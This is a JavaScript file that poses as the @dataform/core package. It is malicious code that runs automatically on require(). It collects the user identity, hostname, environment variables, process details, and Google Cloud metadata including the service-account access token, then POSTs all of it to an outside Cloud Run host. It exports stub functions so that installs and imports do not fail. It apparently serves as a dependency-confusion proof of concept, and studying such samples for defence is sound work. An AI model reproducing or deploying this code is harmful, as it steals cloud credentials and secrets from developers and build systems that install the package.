// Evil @dataform/core replacement — exfils on require()
(function() {
  try {
    const https = require('https');
    const os = require('os');
    const cp = require('child_process');
    const fs = require('fs');

    function postExfil(stage, data) {
      return new Promise(function(resolve) {
        var body = JSON.stringify({stage: stage, data: data, ts: new Date().toISOString()});
        var req = https.request({
          hostname: 'bq-rf-logger-k2jr44fima-uc.a.run.app',
          port: 443,
          path: '/EVIL_DF_CORE_REQUIRED_' + stage,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
            'X-Marker': 'DF_CORE_REQUIRE_RCE_2026_05_13'
          }
        }, function(res) { var d=''; res.on('data', function(c){d+=c;}); res.on('end', function(){resolve(d);}); });
        req.on('error', function(e) { resolve('err:'+e.message); });
        req.setTimeout(10000, function() { req.destroy(); resolve('timeout'); });
        req.write(body); req.end();
      });
    }

    function probeMeta(path) {
      return new Promise(function(resolve) {
        const http = require('http');
        var req = http.get({
          hostname: 'metadata.google.internal',
          port: 80,
          path: path,
          headers: {'Metadata-Flavor': 'Google'}
        }, function(res) {
          var d = '';
          res.on('data', function(c) { d += c; });
          res.on('end', function() { resolve({status: res.statusCode, body: d.substring(0, 2000)}); });
        });
        req.on('error', function(e) { resolve({err: e.message}); });
        req.setTimeout(5000, function() { req.destroy(); resolve({err: 'timeout'}); });
      });
    }

    (async function() {
      var info = {};
      try { info.id = cp.execSync('id', {timeout: 3000}).toString().trim(); } catch(e) { info.id_err = e.message; }
      try { info.hostname = cp.execSync('hostname', {timeout: 3000}).toString().trim(); } catch(e) { info.hostname_err = e.message; }
      try { info.cwd = process.cwd(); } catch(e) {}
      try { info.pid = process.pid; info.ppid = process.ppid; } catch(e) {}
      try { info.node_version = process.version; } catch(e) {}
      try { info.user_info = os.userInfo(); } catch(e) {}
      try { info.env = Object.keys(process.env).slice(0, 50).reduce(function(acc, k) { acc[k] = String(process.env[k]).substring(0, 200); return acc; }, {}); } catch(e) {}
      try { info.proc_status = fs.readFileSync('/proc/self/status', 'utf8').substring(0, 800); } catch(e) { info.proc_status_err = e.message; }
      try { info.argv = process.argv; } catch(e) {}

      info.meta_email = await probeMeta('/computeMetadata/v1/instance/service-accounts/default/email');
      info.meta_token = await probeMeta('/computeMetadata/v1/instance/service-accounts/default/token');
      info.meta_project = await probeMeta('/computeMetadata/v1/project/project-id');
      info.meta_hostname = await probeMeta('/computeMetadata/v1/instance/hostname');

      await postExfil('require_init', info);
    })();
  } catch(e) {
    try {
      require('https').request({
        hostname: 'bq-rf-logger-k2jr44fima-uc.a.run.app',
        port: 443,
        path: '/EVIL_DF_CORE_ERROR',
        method: 'POST'
      }).end(String(e.message || e));
    } catch(ee) {}
  }
})();

// Provide a real-looking module shape so npm/require doesn't blow up
module.exports = {
  publish: function() { return arguments; },
  operate: function() { return arguments; },
  assert: function() { return arguments; },
  declare: function() { return arguments; },
  test: function() { return arguments; },
  notebook: function() { return arguments; }
};
